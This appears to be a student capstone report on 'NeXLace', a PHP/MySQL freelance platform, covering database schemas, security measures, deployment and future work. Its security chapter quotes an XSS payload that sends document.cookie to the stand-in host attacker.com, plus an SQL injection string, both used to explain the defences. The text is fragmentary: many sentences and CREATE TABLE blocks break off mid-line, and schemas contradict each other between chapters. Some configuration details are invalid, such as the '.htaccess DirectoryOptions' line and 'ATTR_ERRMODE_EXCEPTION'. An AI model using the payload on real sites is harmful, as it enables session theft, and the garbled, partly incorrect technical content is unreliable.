      otp_expiry  DATETIME      DEFAULT NULL,
      created_at  TIMESTAMP     DEFAULT CURRENT_TIMESTAMP
  );

  Field Descriptions:
  user_id    — Unique identifier for each user. Auto-incremented by MySQL.
  name       — The user's full display name.
  email      — The user's email address. Must be unique across all accounts.
  password   — BCrypt-hashed password string. Never stored in plain text.
  role       — The user's role: 'client', 'developer', or 'admin'.
  is_active  — Account status. 0 = unverified or suspended. 1 = active.
  otp_code   — Temporarily stores the OTP sent during registration.
  otp_expiry — The date/time at which the OTP becomes invalid.
  created_at — Timestamp recording when the account was registered.

14.3.2  `profiles` Table (Developer Profiles)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
The `profiles` table holds the extended professional information specific to
Developer accounts. It has a one-to-one relationship with the `users` table.

  CREATE TABLE profiles (
      profile_id        INT AUTO_INCREMENT PRIMARY KEY,
      user_id           INT          NOT NULL UNIQUE,
      bio               TEXT         DEFAULT NULL,
      skills            TEXT         DEFAULT NULL,
      hourly_rate       DECIMAL(8,2) DEFAULT NULL,
      portfolio_url     VARCHAR(255) DEFAULT NULL,
      profile_photo     VARCHAR(255) DEFAULT NULL,
      experience_years  INT          DEFAULT 0,
      education         VARCHAR(255) DEFAULT NULL,
      updated_at        TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
                         ON UPDATE CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
  );

  Field Descriptions:
  profile_id       — Unique identifier for the profile record.
  user_id          — FK linking to users(user_id). UNIQUE (one profile/user).
  bio              — Developer's professional biography text.
  skills           — Comma-separated list of technical skills and frameworks.
  hourly_rate      — Developer's stated hourly billing rate.
  portfolio_url    — URL to the developer's external portfolio website.
  profile_photo    — File path to the developer's uploaded profile image.
  experience_years — Number of years of professional experience declared.
  education        — Developer's highest educational qualification.
  updated_at       — Automatically updated timestamp of last profile edit.

14.3.3  `jobs` Table
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
The `jobs` table stores all job listings created by clients. Each row
represents one posting from one client.

  CREATE TABLE jobs (
      job_id           INT AUTO_INCREMENT PRIMARY KEY,
      client_id        INT          NOT NULL,
      title            VARCHAR(200) NOT NULL,
      description      TEXT         NOT NULL,
      skills_required  TEXT         DEFAULT NULL,
      budget           VARCHAR(100) DEFAULT NULL,
      timeline         VARCHAR(100) DEFAULT NULL,
      status           ENUM('open','in_progress','closed') DEFAULT 'open',
      created_at       TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (client_id) REFERENCES users(user_id) ON DELETE CASCADE
  );

  Field Descriptions:
  job_id          — Unique identifier for each job posting.
  client_id       — FK linking to the client's user_id in the users table.
  title           — Short, descriptive title of the job.
  description     — Full detailed description of the project requirements.
  skills_required — Comma-separated list of required technologies/frameworks.
  budget          — Client's budget range as a text string (e.g. "$500–$1000").
  timeline        — Project duration or deadline (e.g. "2 weeks", "1 month").
  status          — Current job status: 'open', 'in_progress', or 'closed'.
  created_at      — Timestamp recording when the job was posted.

  CREATE TABLE applications (

      applied_at    TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,

  app_id       — Unique identifier for each application record.
  job_id       — FK linking to the job the developer applied for.
  developer_id — FK linking to the developer's user_id in the users table.
  cover_letter — The developer's custom application message to the client.
  bid_amount   — The developer's proposed price for the project.
  status       — Current status: 'pending', 'accepted', or 'rejected'.

  attachment  — File path to an uploaded file attachment, if any.
  sent_at     — Timestamp recording when the message was sent.
  is_read     — Read status flag. 0 = unread, 1 = read by the recipient.

      session_id   VARCHAR(128) PRIMARY KEY,
      user_id      INT          NOT NULL,
      device       VARCHAR(255) DEFAULT NULL,
      ip_address   VARCHAR(45)  DEFAULT NULL,
      last_active  TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
                    ON UPDATE CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
  );

  Field Descriptions:
  session_id  — The PHP session ID string (used as the primary key).
  user_id     — FK: the user this session belongs to.
  device      — Browser/device identifier parsed from the HTTP User-Agent.
  ip_address  — The IP address from which the session was created.
  last_active — Automatically updated timestamp of the last activity in
                this session.

14.5 Database Connection Configuration (`db_helper.php`)
--------------------------------------------------------------------------------
All database interactions in NeXLace go through a single centralised
configuration file: `config/db_helper.php`. This file establishes the PDO
(PHP Data Objects) connection to the MySQL database.

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  [SCREENSHOT REQUIRED]                                                  ║
  ║  Caption : Figure 14.12 — db_helper.php in VS Code                      ║
  ║  Content : A screenshot of the config/db_helper.php file open in       ║
  ║            VS Code, showing the PDO connection code with syntax         ║
  ║            highlighting.                                                ║
  ╚══════════════════════════════════════════════════════════════════════════╝

Using a single connection file has two important benefits:
  1. If the database credentials ever change, they only need to be updated
     in one file rather than throughout every PHP script.
  2. All connection parameters and error handling settings are consistent
     across the entire application.

The relevant portion of `db_helper.php` is structured as follows:

  <?php
  $host   = 'localhost';
  $dbname = 'nexlace_db';
  $user   = 'root';
  $pass   = '';

  try {
      $pdo = new PDO(
          "mysql:host=$host;dbname=$dbname;charset=utf8",
          $user,
          $pass
      );
      $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
      $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
  } catch (PDOException $e) {
      http_response_code(500);
      echo json_encode(['error' => 'Database connection failed.']);
      exit;
  }
  ?>

Key configuration details:
  - PDO::ATTR_ERRMODE_EXCEPTION  — Throws a PHP exception on any database
    error, allowing errors to be caught and handled gracefully rather than
    failing silently.
  - PDO::FETCH_ASSOC             — All query results are returned as
    associative arrays (column name as key), which is more readable and
    predictable in PHP code.
  - charset=utf8                 — Ensures all text data is read and written
    in UTF-8 encoding, supporting international characters correctly.
  - The catch block returns a JSON error response and exits cleanly, ensuring
    no partial HTML or unhandled exception output reaches the browser.

Every PHP file that accesses the database begins with:
    require_once '../config/db_helper.php';
or the equivalent relative path — making the $pdo connection object
immediately available for use with prepared statements.

15.1 Choice of Agile Methodology
--------------------------------------------------------------------------------
The NeXLace project was developed using the Agile software development
methodology. Agile is a flexible, iterative approach to building software.
Rather than planning and building everything at once (as in the traditional
Waterfall model), Agile breaks the project into short development cycles called
Sprints. Each Sprint focuses on building and delivering a small, working piece
of the system.

Agile was chosen for NeXLace for three main reasons:

  1. Flexibility: Requirements for a freelance platform are complex and

  2. Continuous Delivery: Each Sprint produces a working, testable version of

  3. Clear Progress Tracking: Agile's Sprint structure makes it easy to measure

The Agile model followed for NeXLace is specifically the Scrum framework,

Sprint cycles, and a maintained Product Backlog to manage all outstanding work.

15.4 Sprint Review and Retrospective
--------------------------------------------------------------------------------

planned deliverables had been completed and were working correctly. Any
incomplete items were carried over into the next Sprint's backlog.

A Sprint Retrospective was also held after each review, examining what went
well, what did not, and what process improvements could be made in the next
Sprint. Key retrospective observations across the project included:

  - Sprint 1 Retrospective: OTP email delivery integration took longer than
    expected due to SMTP configuration challenges. Resolved by isolating the
    OTP service into a standalone Node.js process.

  - Sprint 2 Retrospective: The developer profile and job filtering features
    required more complex SQL JOIN queries than initially estimated. Timeline
    adjustments were made by moving lower-priority admin features to Sprint 4.

  - Sprint 3 Retrospective: The SSE notification system required careful
    handling of connection timeouts and database polling intervals to avoid
    excessive server load. Polling interval was tuned to balance real-time
    responsiveness with server performance.

  - Sprint 4 Retrospective: All planned features were delivered on schedule.
    The chatbot implementation was implemented as a simpler rule-based
    response system rather than a machine-learning model, keeping it within
    the scope and timeline of the project.

  - Sprint 5 Retrospective: Security testing identified two minor input
    validation gaps in the file upload handler, which were fixed before final
    delivery. The platform passed all planned test cases.

16.5 OTP Email Verification System (Nodemailer / OTP Server)
--------------------------------------------------------------------------------
When a new user registers, the platform needs to verify that the email address
they provided actually belongs to them. This is done using an OTP
(One-Time Password) email. A random 6-digit code is generated, emailed to
the user, and must be entered within a time limit to activate the account.

The OTP service is built as a small, separate Node.js application stored
in the `nodemailer/` folder. It uses the Nodemailer library to connect to
an SMTP email provider and send the verification email.

How it works:
  1. api/register.php generates a random 6-digit OTP and saves it (with an
     expiry time) to the `users` table.
  2. register.php then sends an HTTP request to the Node.js OTP server,
     passing the user's email address and the OTP code.
  3. The Node.js server uses Nodemailer to connect to the SMTP provider
     and deliver the email to the user's inbox.
  4. The user enters the code in the OTP verification form on the browser.
  5. The PHP backend checks the entered code against the stored code and
     expiry. If they match and the code is still valid, the user's
     `is_active` field is set to 1 and the account is fully activated.

CHAPTER 17: SECURITY IMPLEMENTATION
================================================================================

Security is one of the most critical aspects of any web platform that handles
personal user data, account credentials, private communications, and financial
information. The NeXLace platform implements multiple layers of security to
protect users and the integrity of the system. This chapter documents each
security measure applied throughout the platform.

17.1 SQL Injection Prevention (PDO Prepared Statements)
--------------------------------------------------------------------------------
SQL injection is one of the most common and dangerous web attacks. It occurs
when an attacker inserts malicious SQL code into a form field or URL parameter,
attempting to manipulate the database query being executed by the server —
potentially reading, modifying, or deleting data they should not have access to.

Example of a vulnerable query (NOT used in NeXLace):
  $sql = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
  // An attacker could enter: ' OR '1'='1 — which would return ALL users.

NeXLace prevents SQL injection by using PDO (PHP Data Objects) Prepared
Statements for every single database query throughout the application. With
prepared statements, the SQL query structure is defined first with placeholders
(?), and then the user-supplied values are bound to those placeholders
separately — making it technically impossible for user input to alter the
structure of the SQL query.

Example of the secure pattern used in NeXLace:
  $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
  $stmt->execute([$_POST['email']]);
  $user = $stmt->fetch();

The user's input ($_POST['email']) is treated entirely as a data value, not
as SQL code. Even if an attacker enters ' OR '1'='1, it is passed as a literal
string to the database and will simply fail to match any real email address.

This pattern is applied consistently in every API endpoint in the /api/ folder.
No raw, unparameterised queries exist anywhere in the NeXLace codebase.

17.2 Cross-Site Scripting (XSS) Prevention (`htmlspecialchars()`)
--------------------------------------------------------------------------------
Cross-Site Scripting (XSS) is an attack where a malicious user injects
JavaScript code into content that is then displayed to other users in their
browser. When the victim's browser renders that page, the injected script
executes — potentially stealing session cookies, redirecting users, or
performing actions on their behalf without their knowledge.

For example, a developer could enter the following as their "bio" in their
profile:
  <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Without protection, any client viewing that developer's profile would have
this script execute in their browser, exposing their session cookie.

NeXLace prevents XSS by passing all user-generated content through PHP's
`htmlspecialchars()` function before rendering it in any HTML page. This
function converts special characters that have meaning in HTML (such as <, >,
", and &) into their safe HTML entity equivalents (&lt;, &gt;, &quot;, &amp;),
so they are displayed as text rather than interpreted as HTML or JavaScript.

Example of the pattern used in NeXLace:
  echo htmlspecialchars($user['name'], ENT_QUOTES, 'UTF-8');
  // Output: safely encoded text — cannot execute as code.

This is applied to every variable that outputs user-supplied content into
an HTML page — including names, bios, job titles, descriptions, messages,
and notification texts.

17.3 Password Hashing (BCrypt via `password_hash()`)
--------------------------------------------------------------------------------
Storing passwords in plain text is one of the most serious security failures
a web application can commit. If the database is ever compromised, every user's
password would be immediately exposed.

  ║  [SCREENSHOT REQUIRED]                                                  ║
  ║  Caption : Figure 17.2 — Password Hashing in register.php               ║

  ║            password_hash() line and the INSERT query storing the hash.  ║
  ╚══════════════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════════════════╗
  ║  [SCREENSHOT REQUIRED]                                                  ║

  ║  Content : Screenshot of the users table in phpMyAdmin showing the      ║

  ╚══════════════════════════════════════════════════════════════════════════╝

NeXLace never stores passwords in plain text. All passwords are hashed using
PHP's built-in `password_hash()` function with the `PASSWORD_BCRYPT` algorithm
before being written to the database.

BCrypt is a deliberately slow hashing algorithm designed specifically for
passwords. Its slowness makes it computationally expensive for attackers
trying to crack password hashes through brute-force or rainbow table attacks.
BCrypt also automatically generates and embeds a unique random salt into each
hash, ensuring that even two users with the same password will have completely
different hash values stored in the database.

Registration (api/register.php):
  $hashed = password_hash($_POST['password'], PASSWORD_BCRYPT);
  // The $hashed value is what gets stored in the database.

Login verification (api/login.php):
  if (password_verify($_POST['password'], $user['password'])) {
      // Credentials match — start session
  }

The `password_verify()` function takes the plain-text password entered at
login and the stored hash, and safely compares them — returning true only
if they match. The original password never needs to be stored or re-used.

17.4 CSRF Token Protection
--------------------------------------------------------------------------------
Cross-Site Request Forgery (CSRF) is an attack where a malicious website
tricks a logged-in user's browser into unknowingly sending a request to the
NeXLace platform — for example, submitting a form or making an API call on
the user's behalf without their knowledge or consent.

NeXLace implements CSRF token protection on all state-changing form
submissions and API calls. The mechanism works as follows:

  1. When a PHP page loads, a unique, random CSRF token is generated using
     `bin2hex(random_bytes(32))` and stored in the user's session:
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));

  2. The token is embedded as a hidden field in every HTML form and as a
     request header in every JavaScript AJAX call that modifies data.

  3. When the form is submitted or the AJAX request is received, the API
     endpoint compares the submitted token against the one stored in the
     session:
     if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
         http_response_code(403);
         echo json_encode(['error' => 'Invalid CSRF token.']);
         exit;
     }

  4. If the tokens do not match (as would be the case for a forged request
     from an external site), the request is immediately rejected with a
     403 Forbidden response.

Because the CSRF token is unique per session and unknown to any external site,
a forged request from another origin cannot include a valid token and will
always be rejected.

17.5 Session Management and Secure Logout
--------------------------------------------------------------------------------
Sessions are the mechanism PHP uses to maintain a user's authenticated state
across multiple page loads. Proper session management is critical to prevent
session hijacking and ensure users are correctly logged out.

NeXLace implements the following session security practices:

  Session Initialisation:
  Sessions are started with `session_start()` at the top of every protected
  PHP page and API endpoint. The session stores the authenticated user's
  `user_id`, `role`, and `username`. All subsequent role and authentication
  checks read from these session variables rather than from the database,
  keeping protected pages fast and consistent.

  Session Regeneration on Login:
  After a successful login, `session_regenerate_id(true)` is called before
  writing any session variables. This generates a new session ID, preventing
  session fixation attacks where an attacker pre-sets a known session ID to
  hijack a session after the victim logs in.

  Secure Logout (`logout.php`):
  Logout is not simply clearing a cookie — it properly destroys the server-side
  session data:
    session_start();
    session_unset();      // Clear all session variables
    session_destroy();    // Destroy the session on the server
    // Then redirect user to login page

  Active Session Tracking (`login&security.php`):
  The `sessions` database table records active sessions (session ID, device,
  IP address, and last active timestamp). Users can view all active sessions
  from their Login & Security settings page and terminate any suspicious
  session remotely — which deletes that session record and prevents further
  use of that session ID.

17.6 Role-Based Access Control
--------------------------------------------------------------------------------
Role-Based Access Control (RBAC) ensures that every user can only access
pages and perform actions that their assigned role permits. This prevents
privilege escalation — for example, a developer accessing client-only pages
like the billing page or the job-posting interface.

Every protected PHP page and API endpoint begins with an authentication and
role check via `includes/auth_helper.php`. This helper function:

  1. Calls `session_start()` and verifies that a valid session exists.
  2. Checks that the session's `role` variable matches the permitted role
     for the current page or endpoint.
  3. If either check fails, the request is terminated and the user is
     redirected to the appropriate page (login page if not authenticated,
     or their own dashboard if authenticated but wrong role).

Example usage at the top of postjob.php (Client-only page):
  require_once 'includes/auth_helper.php';
  require_role('client');
  // If the user is a developer or not logged in, execution stops here.

Example usage at the top of api/post_job.php (Client-only API):
  require_once '../includes/auth_helper.php';
  require_role('client');
  // Developers calling this endpoint via AJAX receive a 403 response.

The admin panel has its own isolated auth layer (`admin_panel/auth.php`)
that verifies the `admin` role before granting access to any admin page.

17.7 Brute-Force and Unauthorised Access Prevention
--------------------------------------------------------------------------------
Brute-force attacks involve an automated system trying thousands of
username/password combinations rapidly in an attempt to guess credentials.
Unauthorised access attempts include trying to directly access protected
pages or API endpoints without a valid session.

NeXLace implements the following countermeasures:

  Login Attempt Rate Limiting:
  The login form includes a client-side lockout mechanism. After a configurable
  number of failed login attempts (e.g. 5 attempts), the login button is
  temporarily disabled for a cooldown period, preventing rapid automated
  submission. The attempt count is tracked in the browser's sessionStorage
  and reset on successful login.

17.8 File Upload Security (for Attachments)
--------------------------------------------------------------------------------
NeXLace allows users to upload files in two contexts: profile photo uploads
on `createdeveloperprofile.php`, and file attachments in the messaging system
on `messages.php`. File uploads are a known attack vector — without proper
validation, an attacker could upload a malicious PHP script disguised as
an image, which could then be executed on the server.

NeXLace implements the following file upload security controls:

  1. File Type Whitelist Validation:
     Uploaded files are checked against a strict whitelist of permitted MIME
     types and file extensions. For profile photos, only image formats are
     accepted (image/jpeg, image/png, image/gif, image/webp). For message
     attachments, common safe document and image formats are permitted.
     Any file with a MIME type or extension not on the whitelist is rejected
     immediately with an error response.

  2. File Size Limit:
     A maximum file size is enforced server-side. Files exceeding the limit
     are rejected before any processing occurs, preventing denial-of-service
     attacks via excessively large uploads.

  3. Randomised Filename:
     The original filename provided by the user is never used directly. Each
     uploaded file is given a new, randomly generated filename using
     `uniqid() . '.' . $extension` before being saved. This prevents
     predictable filenames and path traversal attacks.

  4. Storage Outside Web Root (Best Practice Note):
     Uploaded files are stored in the `/uploads/` directory. In a production
     environment, this directory should be configured to deny direct PHP
     execution (via `.htaccess DirectoryOptions -ExecCGI`) to prevent any
     accidentally or maliciously uploaded script from being executed.

  5. Server-Side Re-Validation:
     All validation is performed on the server side in the PHP API endpoint.
     Client-side validation (HTML `accept` attribute) is used only to
     improve user experience and is never relied upon for security.

19.2 Local Deployment Steps
--------------------------------------------------------------------------------
The following steps describe the complete process to set up and run the
NeXLace platform on a new local machine using Laragon.

  Step 1 — Install Laragon:
  Download and install Laragon from https://laragon.org. During setup,
  ensure Apache, MySQL, and PHP 8.1+ are included in the installation.

  Step 2 — Clone or Copy the Project:
  Place the nexlace/ project folder into the Laragon web root directory:
    C:\laragon\www\nexlace\
  If using Git, run from the www directory:
    git clone [repository-url] nexlace

  Step 3 — Start Laragon Services:
  Open Laragon and click "Start All" to start the Apache web server and
  MySQL database. Verify both services show a running/green status.

  Step 4 — Create the Database:
  Open phpMyAdmin (accessible via the Laragon menu or at localhost/phpmyadmin).
  Create a new database named: nexlace_db
  Import the SQL schema file (nexlace_db.sql) if provided, or run the
  CREATE TABLE statements from Chapter 14 to set up all eight tables.

  Step 5 — Configure Database Connection:
  Open config/db_helper.php and verify the connection settings match
  the local environment (default Laragon settings):
    $host   = 'localhost';
    $dbname = 'nexlace_db';
    $user   = 'root';
    $pass   = '';   // Laragon default is no root password

  Step 6 — Install Node.js OTP Server Dependencies:
  Open a terminal and navigate to the nodemailer/ folder:
    cd C:\laragon\www\nexlace\nodemailer\
    npm install
  Configure the SMTP credentials inside server.js with the email account
  details to be used for sending OTP emails.

  Step 7 — Start the OTP Email Server:
  Run the provided batch file to start the Node.js OTP service:
    Double-click: nodemailer\start-otp-server.bat
  Or run manually in a terminal:
    node nodemailer/server.js
  The OTP server should now be listening on http://localhost:3000.

  Step 8 — Access the Platform:
  Open a web browser and navigate to:
    http://nexlace.test      (if Laragon virtual host is configured)
    http://localhost/nexlace  (alternative)
  The NeXLace landing page should now be visible and fully functional.

  Security Hardening for Production:
  1. Change database credentials from default (root / blank password) to a
     strong, unique username and password. Update config/db_helper.php.
  2. Move db_helper.php and any config files outside the web root, or
     protect them with .htaccess deny rules.
  3. Enable HTTPS using a valid SSL certificate (e.g. Let's Encrypt via
     Certbot) — all traffic should be encrypted in transit.
  4. Set PHP display_errors to Off in php.ini — errors must be logged
     to a file, not displayed to browser users.
  5. Configure the /uploads/ directory to deny PHP script execution
     via .htaccess.
  6. Set strict file permissions — only the web server user should be
     able to write to the uploads/ directory.
  7. Set session.cookie_secure = 1 and session.cookie_httponly = 1
     in php.ini to protect session cookies on HTTPS.

  Deployment Steps to a Live Server:
  1. Upload the nexlace/ project folder to the server's web root (e.g.
     /var/www/html/nexlace/ on a Linux VPS) via FTP or Git pull.
  2. Import nexlace_db.sql into the production MySQL server.
  3. Update config/db_helper.php with production database credentials.
  4. Install Node.js on the server and run:
       npm install (in the nodemailer/ folder)
  5. Use PM2 (a Node.js process manager) to keep the OTP server running
     continuously:
       pm2 start nodemailer/server.js --name nexlace-otp
  6. Configure Apache/Nginx virtual host to point to the nexlace/ directory.
  7. Install and enable SSL certificate.
  8. Test all critical user flows on the live server before public launch.

21.2 System Strengths
--------------------------------------------------------------------------------
The following strengths were identified through testing, analysis, and
comparison with the platform's stated objectives:

  1. Domain Specificity:
     By focusing exclusively on web development, NeXLace provides a more
     relevant and focused experience than general freelance platforms. Both
     clients and developers benefit from a tailored interface, skill filters,
     and relevant job categories.

  2. Security Architecture:
     The multi-layer security approach — prepared statements, BCrypt,
     htmlspecialchars, CSRF tokens, RBAC, and file upload validation —
     provides a solid security foundation that addresses all common web
     application attack vectors.

  3. Real-Time Communication:
     The Server-Sent Events (SSE) notification system provides genuine
     real-time updates without the complexity of WebSockets, keeping the
     implementation practical and effective for a PHP/MySQL stack.

  4. Modular Architecture:
     The separation of concerns — config/, api/, includes/, css/, and js/
     directories, with centralized db_helper.php and auth_helper.php —
     makes the codebase maintainable, scalable, and easy to extend.

  5. User Experience:
     The platform provides a clean, intuitive interface with role-specific
     views, AJAX-driven interactions (no full page reloads for core tasks),
     and a responsive layout across all screen sizes.

21.3 Limitations and Constraints
--------------------------------------------------------------------------------
The following limitations were identified during development and testing.
These are not failures of the project but honest acknowledgements of the
scope boundaries and constraints of an academic capstone project:

  1. Local Deployment Only:
     The platform was developed and evaluated in a local Laragon environment.
     It has not been deployed to a public-facing production server or tested
     under real internet traffic conditions. Production deployment would
     require HTTPS, stronger database credentials, and server hardening
     as outlined in Chapter 19.

  2. Payments Not Implemented:
     The billing page (billingpayment.php) provides a summary view but does
     not integrate a real payment gateway. Actual financial transactions
     between clients and developers are outside the scope of this project.
     Integration with Stripe or PayPal would be required for a production
     system.

  3. Rule-Based Chatbot:
     The chatbot operates on a keyword-matching, rule-based system. It cannot
     understand natural language questions or learn from user interactions.
     A production platform would benefit from integration with an NLP-based
     API (e.g. OpenAI API or Dialogflow) for a more intelligent assistant.

  4. No Review System Implemented:
     While the `reviews` database table was defined and documented, the
     frontend review submission and display UI was not fully implemented
     within the project timeline. This is identified as future work.

  5. Single-Server Architecture:
     The current architecture uses a single Apache/MySQL/Node.js stack.
     For a high-traffic production environment, load balancing, database
     replication, and CDN integration would be necessary.

  6. Client-Side Rate Limiting:
     Login attempt limiting is currently enforced client-side using
     sessionStorage. This is a useful UX guard but can be bypassed by a
     determined attacker. A production system should implement server-side
     rate limiting (e.g. IP-based attempt tracking in the database).

CHAPTER 22: FUTURE WORK
================================================================================

The NeXLace platform as delivered represents a complete, functional version 1
product. However, numerous enhancements and extensions could be pursued in
future iterations to expand the platform's capabilities and make it
production-ready for real-world commercial deployment.

22.1 Payment Gateway Integration
--------------------------------------------------------------------------------
The most impactful next step for NeXLace would be the integration of a real
payment gateway — such as Stripe or PayPal — to facilitate actual financial
transactions between clients and developers. This would include:
  - Milestone-based payment escrow (funds held until work is approved)
  - Invoice generation and download
  - Transaction history and receipts
  - Platform service fee collection

22.2 Review and Rating System
--------------------------------------------------------------------------------
The `reviews` database table was designed and documented in Chapter 14 but
the full frontend review flow was not implemented within the project timeline.
Future development would add:
  - A post-project review submission form for both client and developer
  - Star rating (1–5) and written review display on developer profiles
  - Average rating calculation and display on developer profile cards
  - Review filtering and sorting on the developer directory page

22.3 AI-Powered Matching and Recommendations
--------------------------------------------------------------------------------
A significant enhancement to the platform's core value proposition would be
an AI-powered matching engine that automatically recommends:
  - The most relevant developer profiles to a client based on their posted
    job's required skills, budget, and description
  - The most relevant job listings to a developer based on their listed
    skills, experience, and hourly rate

This could be implemented using collaborative filtering, TF-IDF skill
matching, or an integration with an LLM API (e.g. OpenAI) for semantic
similarity matching.

22.4 Natural Language Chatbot (NLP Integration)
--------------------------------------------------------------------------------
The current rule-based chatbot would be replaced or augmented with an NLP-
capable conversational AI — using the OpenAI API, Dialogflow, or a
locally hosted LLM — to provide natural language understanding, context-
aware responses, and the ability to handle a much wider range of user queries
without relying on keyword matching.

22.5 Mobile Application (PWA or Native)
--------------------------------------------------------------------------------
Converting NeXLace into a Progressive Web App (PWA) would allow users to
install it on their mobile devices and receive push notifications natively.
A longer-term option would be developing native iOS and Android applications
using React Native, sharing the existing backend PHP/MySQL/Node.js API layer.

22.6 WebSocket-Based Real-Time Messaging
--------------------------------------------------------------------------------
The current AJAX polling approach for message delivery works well at the
scale of this project. For a production platform with many concurrent users,
upgrading to a WebSocket-based solution (using Node.js with Socket.io) would
provide truly instantaneous bi-directional messaging with lower server overhead.

22.7 Two-Factor Authentication (2FA)
--------------------------------------------------------------------------------
Adding 2FA as an optional enhanced security setting in the Login & Security
page would allow users to protect their accounts with an authenticator app
(e.g. Google Authenticator using TOTP — Time-based One-Time Passwords)
in addition to their password, providing a significantly higher level of
account security.

23.1 Summary of the Project

This report has documented the full design, development, and evaluation of

23.2 Reflection on the Development Process
--------------------------------------------------------------------------------
The Agile methodology proved highly effective for managing a project of this
complexity. Breaking the work into five defined Sprints allowed steady,
measurable progress and ensured that critical features — authentication,
job marketplace, and messaging — were prioritised and delivered before
secondary features like the chatbot and billing page.

The most technically challenging aspect of the project was the Server-Sent
Events notification system — specifically managing long-lived HTTP connections,
database polling intervals, and connection timeout handling across different
browsers. This challenge provided valuable hands-on experience with real-time
web communication patterns beyond standard AJAX.

The security implementation was an equally meaningful learning experience.
Applying each security measure — prepared statements, BCrypt, htmlspecialchars,
CSRF tokens, RBAC, and file upload validation — across a large, multi-file
codebase requires discipline and consistency. This experience reinforced why
centralised helper files (db_helper.php, auth_helper.php) are essential to
maintaining security standards across an application.

The NeXLace platform demonstrates that a focused, niche marketplace

structural weaknesses of general-purpose freelance platforms — through
domain-specific design, structured trust mechanisms, and quality-gated
communication tools.

All primary objectives defined at the outset of the project were achieved.
The platform has been fully implemented, comprehensively tested across seven
testing dimensions, and documented in this report.

NeXLace represents a technically sound, well-structured, and security-
conscious web application that is ready for further development, production
hardening, and real-world deployment. The foundation laid by this project
provides a strong and extensible base for the future enhancements outlined
in Chapter 22.

25.1 Appendix A: User Manual / Walkthrough Guide
--------------------------------------------------------------------------------
Below is a brief quick-start guide that would be provided to a new client
or developer using the platform.

  For Developers:
  1. Visit the home page and click "Join as a Developer".
  2. Fill in your name, email, and password. Submit the form.
  3. Check your email inbox for the 6-digit OTP code, enter it, and verify.
  4. Log in and navigate to the "Profile" tab to fill in your bio, hourly
     rate, core skills, and upload a profile photo.
  5. Go to "Find Work," filter jobs by required skills, and click "Apply" on
     a job. Add your cover letter and bid amount.
  6. Check your notification bell daily. When a client accepts your bid, an
     alert will appear.
  7. Go to the "Messages" tab to begin chatting with the client.

  For Clients:
  1. Visit the home page and click "Hire a Developer".
  2. Register with your details and verify your email via the OTP.
  3. Go to "Post a Job," fill in the job title, detailed description, required
     technologies, estimated budget, and deadline. Click Submit.
  4. Wait for applications to arrive on your Dashboard.
  5. Alternatively, browse "Developer Profiles." If you find a developer who
     looks promising, view their profile.
  6. On the Dashboard, review incoming applications and click "Accept" to
     green-light a developer for the project.
  7. Head to "Messages" to discuss project milestones with your hired developer.

25.2 Appendix B: Core Database Schema (SQL Export)
--------------------------------------------------------------------------------
For reference, the complete SQL `CREATE TABLE` script required to recreate
the NeXLace database from scratch is included here.

```sql
CREATE DATABASE IF NOT EXISTS nexlace_db;
USE nexlace_db;

CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `name` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL UNIQUE,
  `password` varchar(255) NOT NULL,
  `role` enum('client','developer','admin') NOT NULL,
  `is_active` tinyint(1) DEFAULT 0,
  `join_date` datetime DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE `developer_profiles` (
  `user_id` int NOT NULL PRIMARY KEY,
  `bio` text,
  `hourly_rate` decimal(10,2) DEFAULT NULL,
  `skills` varchar(255) DEFAULT NULL,
  `portfolio_url` varchar(255) DEFAULT NULL,
  `profile_pic` varchar(255) DEFAULT 'default.png',
  FOREIGN KEY (`user_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `jobs` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `client_id` int NOT NULL,
  `title` varchar(150) NOT NULL,
  `description` text NOT NULL,
  `budget` decimal(10,2) DEFAULT NULL,
  `deadline` date DEFAULT NULL,
  `tech_stack` varchar(255) DEFAULT NULL,
  `status` enum('open','in_progress','completed','cancelled') DEFAULT 'open',
  `posted_at` datetime DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (`client_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `applications` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `job_id` int NOT NULL,
  `developer_id` int NOT NULL,
  `cover_letter` text,
  `bid_amount` decimal(10,2) DEFAULT NULL,
  `status` enum('pending','accepted','rejected') DEFAULT 'pending',
  `applied_at` datetime DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (`job_id`) REFERENCES `jobs`(`id`) ON DELETE CASCADE,
  FOREIGN KEY (`developer_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `messages` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `sender_id` int NOT NULL,
  `receiver_id` int NOT NULL,
  `content` text,
  `file_url` varchar(255) DEFAULT NULL,
  `sent_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `is_read` tinyint(1) DEFAULT 0,
  FOREIGN KEY (`sender_id`) REFERENCES `users`(`id`) ON DELETE CASCADE,
  FOREIGN KEY (`receiver_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
);

CREATE TABLE `message_requests` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `sender_id` int NOT NULL,
